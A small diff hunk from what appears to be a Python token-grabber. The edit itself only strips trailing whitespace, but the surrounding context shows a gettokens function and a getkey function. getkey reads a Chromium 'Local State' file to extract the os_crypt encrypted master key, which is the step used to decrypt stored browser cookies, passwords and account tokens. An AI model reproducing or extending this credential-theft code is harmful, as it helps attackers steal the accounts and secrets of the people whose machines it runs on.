@@ -89,7 +89,7 @@ def gettokens(path):
             continue
 
     return tokens
-                        
+
 def getkey(path):
     with open(path + f"\\Local State", "r") as file:
         key = json.loads(file.read())['os_crypt']['encrypted_key']
